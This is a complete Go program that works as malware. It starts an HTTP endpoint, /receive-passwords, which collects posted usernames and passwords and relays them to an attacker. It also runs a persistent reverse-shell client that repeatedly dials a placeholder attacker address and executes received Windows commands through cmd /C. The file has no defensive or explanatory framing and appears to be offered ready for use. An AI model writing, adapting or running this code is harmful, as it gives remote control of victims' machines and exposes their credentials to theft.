package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

// Structs for credentials
type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type Payload struct {
	Credentials []Credential `json:"credentials"`
}

// Global variable to hold the reverse shell connection
var listenerConn net.Conn

// HTTP handler for password manager with CORS support
func receivePasswords(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	if r.Method == http.MethodOptions {
		w.WriteHeader(http.StatusOK)
		return
	}

	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload Payload
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	for _, cred := range payload.Credentials {
		line := fmt.Sprintf("Username: %s | Password: %s", cred.Username, cred.Password)
		fmt.Println("[HTTP] Received:", line)
		if listenerConn != nil {
			fmt.Fprintln(listenerConn, line)
		}
	}

	w.Write([]byte(`{"message":"Credentials sent successfully"}`))
}

// Reverse shell: executes commands received from listener
func handleConnection(conn net.Conn) {
	listenerConn = conn
	defer func() { listenerConn = nil; conn.Close() }()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		cmd := scanner.Text()
		if strings.ToLower(cmd) == "exit" {
			break
		}

		output, err := executeCommand(cmd)
		if err != nil {
			fmt.Fprintln(conn, "Error:", err)
		} else {
			fmt.Fprintln(conn, output)
		}
	}
}

// Execute Windows commands
func executeCommand(cmd string) (string, error) {
	out, err := exec.Command("cmd", "/C", cmd).CombinedOutput()
	return string(out), err
}

// Persistent client that reconnects to your listener
func persistentClient() {
	for {
		conn, err := net.Dial("tcp", "YOUR IP ADDRESS FOR REVERSE SHELL:50000")
		if err != nil {
			fmt.Println("Failed to connect, retrying in 5s...")
			time.Sleep(5 * time.Second)
			continue
		}
		fmt.Println("Connected to listener!")
		handleConnection(conn)
	}
}

func main() {
	// Start HTTP server in a goroutine
	mux := http.NewServeMux()
	mux.HandleFunc("/receive-passwords", receivePasswords)

	server := &http.Server{
		Addr:    ":3000",
		Handler: mux,
	}

	go func() {
		log.Println("HTTP server running on http://localhost:3000")
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("Server failed: %v", err)
		}
	}()

	// Start persistent reverse shell client
	go persistentClient()

	// Wait for shutdown signal
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)
	<-stop

	log.Println("Shutting down server...")
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := server.Shutdown(ctx); err != nil {
		log.Fatalf("Server forced to shutdown: %v", err)
	}
	log.Println("Server exited gracefully")
}

